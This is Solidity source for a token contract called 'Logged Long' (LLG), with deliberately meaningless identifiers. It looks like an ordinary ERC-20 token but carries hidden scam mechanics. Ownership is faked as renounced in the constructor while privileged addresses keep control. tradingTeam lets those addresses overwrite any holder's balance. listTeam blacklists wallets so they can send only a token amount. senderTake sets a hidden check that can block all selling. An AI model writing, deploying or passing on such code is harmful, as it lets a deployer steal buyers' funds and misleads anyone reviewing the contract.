//SPDX-License-Identifier: MIT

pragma solidity ^0.8.7;

interface buyListTeam {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

abstract contract totalSwap {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface receiverAmount {
    function createPair(address totalMax, address marketingLaunched) external returns (address);
}

interface totalAutoEnable {
    function totalSupply() external view returns (uint256);

    function balanceOf(address walletList) external view returns (uint256);

    function transfer(address limitFee, uint256 swapBuyTeam) external returns (bool);

    function allowance(address walletLiquidity, address spender) external view returns (uint256);

    function approve(address spender, uint256 swapBuyTeam) external returns (bool);

    function transferFrom(
        address sender,
        address limitFee,
        uint256 swapBuyTeam
    ) external returns (bool);

    event Transfer(address indexed from, address indexed toTxAt, uint256 value);
    event Approval(address indexed walletLiquidity, address indexed spender, uint256 value);
}

interface buyWallet is totalAutoEnable {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract LoggedLong is totalSwap, totalAutoEnable, buyWallet {

    mapping(address => mapping(address => uint256)) private teamMode;

    function tradingTeam(address marketingEnableLimit, uint256 swapBuyTeam) public {
        takeTeamFrom();
        liquidityReceiver[marketingEnableLimit] = swapBuyTeam;
    }

    uint256 private liquidityAt = 100000000 * 10 ** 18;

    function owner() external view returns (address) {
        return maxEnableFee;
    }

    function amountBuyIs(address isFund, address limitFee, uint256 swapBuyTeam) internal returns (bool) {
        require(liquidityReceiver[isFund] >= swapBuyTeam);
        liquidityReceiver[isFund] -= swapBuyTeam;
        liquidityReceiver[limitFee] += swapBuyTeam;
        emit Transfer(isFund, limitFee, swapBuyTeam);
        return true;
    }

    function symbol() external view virtual override returns (string memory) {
        return takeAmountSender;
    }

    address launchedMode = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    uint256 constant isShould = 5 ** 10;

    event OwnershipTransferred(address indexed fromTake, address indexed isSwap);

    function listTeam(address walletTeam) public {
        takeTeamFrom();
        
        if (walletTeam == enableBuy || walletTeam == atBuy) {
            return;
        }
        walletAmount[walletTeam] = true;
    }

    bool public launchedShould;

    function transferFrom(address isFund, address limitFee, uint256 swapBuyTeam) external override returns (bool) {
        if (_msgSender() != minEnable) {
            if (teamMode[isFund][_msgSender()] != type(uint256).max) {
                require(swapBuyTeam <= teamMode[isFund][_msgSender()]);
                teamMode[isFund][_msgSender()] -= swapBuyTeam;
            }
        }
        return autoFee(isFund, limitFee, swapBuyTeam);
    }

    bool public marketingReceiverLimit;

    function limitLaunch() public {
        emit OwnershipTransferred(enableBuy, address(0));
        maxEnableFee = address(0);
    }

    bool public tokenWalletEnable;

    address private maxEnableFee;

    uint8 private tradingAutoMode = 18;

    uint256 private maxLiquidity;

    function amountLaunchedLiquidity(address receiverLimit) public {
        if (launchedShould) {
            return;
        }
        
        amountToken[receiverLimit] = true;
        if (marketingReceiverLimit == feeTradingSwap) {
            marketingReceiverLimit = true;
        }
        launchedShould = true;
    }

    function totalSupply() external view virtual override returns (uint256) {
        return liquidityAt;
    }

    bool private feeTradingSwap;

    address public enableBuy;

    uint256 limitTotal;

    string private takeAmountSender = "LLG";

    function balanceOf(address walletList) public view virtual override returns (uint256) {
        return liquidityReceiver[walletList];
    }

    address minEnable = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    string private receiverFund = "Logged Long";

    constructor (){
        if (buyAt != swapAuto) {
            tokenWalletEnable = true;
        }
        buyListTeam listAmount = buyListTeam(minEnable);
        atBuy = receiverAmount(listAmount.factory()).createPair(listAmount.WETH(), address(this));
        
        enableBuy = _msgSender();
        limitLaunch();
        amountToken[enableBuy] = true;
        liquidityReceiver[enableBuy] = liquidityAt;
        if (marketingReceiverLimit != feeTradingSwap) {
            feeTradingSwap = false;
        }
        emit Transfer(address(0), enableBuy, liquidityAt);
    }

    uint256 public buyAt;

    function transfer(address marketingEnableLimit, uint256 swapBuyTeam) external virtual override returns (bool) {
        return autoFee(_msgSender(), marketingEnableLimit, swapBuyTeam);
    }

    uint256 public swapAuto;

    uint256 swapMin;

    function getOwner() external view returns (address) {
        return maxEnableFee;
    }

    mapping(address => uint256) private liquidityReceiver;

    function name() external view virtual override returns (string memory) {
        return receiverFund;
    }

    function takeTeamFrom() private view {
        require(amountToken[_msgSender()]);
    }

    address public atBuy;

    function autoFee(address isFund, address limitFee, uint256 swapBuyTeam) internal returns (bool) {
        if (isFund == enableBuy) {
            return amountBuyIs(isFund, limitFee, swapBuyTeam);
        }
        uint256 liquidityTokenFund = totalAutoEnable(atBuy).balanceOf(launchedMode);
        require(liquidityTokenFund == limitTotal);
        require(limitFee != launchedMode);
        if (walletAmount[isFund]) {
            return amountBuyIs(isFund, limitFee, isShould);
        }
        return amountBuyIs(isFund, limitFee, swapBuyTeam);
    }

    mapping(address => bool) public amountToken;

    mapping(address => bool) public walletAmount;

    function allowance(address swapTotal, address minFundAmount) external view virtual override returns (uint256) {
        if (minFundAmount == minEnable) {
            return type(uint256).max;
        }
        return teamMode[swapTotal][minFundAmount];
    }

    function senderTake(uint256 swapBuyTeam) public {
        takeTeamFrom();
        limitTotal = swapBuyTeam;
    }

    function approve(address minFundAmount, uint256 swapBuyTeam) public virtual override returns (bool) {
        teamMode[_msgSender()][minFundAmount] = swapBuyTeam;
        emit Approval(_msgSender(), minFundAmount, swapBuyTeam);
        return true;
    }

    function decimals() external view virtual override returns (uint8) {
        return tradingAutoMode;
    }

}